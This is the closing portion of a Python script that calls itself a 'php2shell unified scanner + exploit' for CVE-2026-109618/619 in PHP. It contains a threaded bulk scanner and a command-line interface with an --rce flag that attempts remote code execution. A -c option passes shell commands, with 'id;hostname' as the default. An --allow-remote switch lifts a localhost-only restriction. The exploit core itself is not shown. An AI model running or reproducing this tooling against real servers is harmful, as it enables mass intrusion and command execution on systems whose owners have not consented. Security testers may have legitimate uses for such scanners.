    verdict = print_result(info, deep_result, rce_result)

    info["_deep"] = deep_result
    info["_rce"] = rce_result
    info["_verdict"] = verdict
    return info


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Bulk scan
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def bulk_scan(targets, output=None, deep=False, rce=False, workers=5, command="id;hostname"):
    results = []

    def _scan_one(url):
        try:
            return scan(url, deep=deep, rce=rce, command=command)
        except Exception as e:
            return {"url": url, "error": str(e)}

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_scan_one, t): t for t in targets}
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            results.append(r)

    if output:
        with open(output, "w") as f:
            for r in results:
                safe = {k: v for k, v in r.items() if not k.startswith("_") or k == "_verdict"}
                f.write(json.dumps(safe, default=str) + "\n")
        print(f"\nResults: {output}")

    vulns = sum(1 for r in results if r.get("status") in ("VULN", "EOL"))
    print(f"\nTotal: {len(results)} | Vulnerable: {vulns}")
    return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    ap = argparse.ArgumentParser(
        description="p2s — php2shell unified scanner + exploit (CVE-2026-109618/619)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://target.com/               Auto-detect + assess
  %(prog)s https://target.com/ --deep        Full OOM + stale state probe
  %(prog)s https://target.com/ --rce         Attempt RCE
  %(prog)s https://target.com/ --rce -c 'id' Custom command
  %(prog)s -f targets.txt -o out.jsonl       Bulk scan
  %(prog)s --version 8.3.12                  Offline version check
        """)
    ap.add_argument("url", nargs="?", help="Target URL")
    ap.add_argument("-f", "--file", help="File with URLs (one per line)")
    ap.add_argument("-o", "--output", help="JSONL output file")
    ap.add_argument("--deep", action="store_true",
                    help="OOM crash + stale state detection")
    ap.add_argument("--rce", action="store_true",
                    help="Attempt RCE (implies --deep)")
    ap.add_argument("-c", "--command", default="id;hostname",
                    help="Shell command for RCE (default: id;hostname)")
    ap.add_argument("--version", dest="check_ver",
                    help="Offline version check (e.g. 8.3.12)")
    ap.add_argument("--workers", type=int, default=5,
                    help="Parallel workers for bulk scan (default: 5)")
    ap.add_argument("--allow-remote", action="store_true",
                    help="Required for non-localhost targets")
    args = ap.parse_args()

    # Offline version check
    if args.check_ver:
        ver, status = classify(args.check_ver)
        color = RED if status in ("VULN", "EOL") else GRN if status == "SAFE" else YLW
        print(f"PHP {ver}: {_c(color, status)}")
        fix = FIXED.get(tuple(int(x) for x in ver.split(".")[:2]))
        if fix:
            print(f"Fix: {ver.rsplit('.', 1)[0]}.{fix}")
        sys.exit(2 if status in ("VULN", "EOL") else 0)

    if not args.url and not args.file:
        ap.error("provide a URL or -f targets.txt or --version X.Y.Z")

    # Safety check
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

    if not args.allow_remote:
        for t in targets:
            u = urlparse(t)
            if u.hostname not in ("localhost", "127.0.0.1", "::1"):
                print(f"[!] Use --allow-remote for non-localhost targets: {t}")
                sys.exit(1)

    if args.rce:
        args.deep = True

    if len(targets) == 1:
        r = scan(targets[0], deep=args.deep, rce=args.rce, command=args.command)
        sys.exit(2 if r.get("status") in ("VULN", "EOL") else 0)
    else:
        results = bulk_scan(targets, output=args.output, deep=args.deep,
                           rce=args.rce, workers=args.workers, command=args.command)
        vulns = sum(1 for r in results if r.get("status") in ("VULN", "EOL"))
        sys.exit(2 if vulns > 0 else 0)


if __name__ == "__main__":
    main()
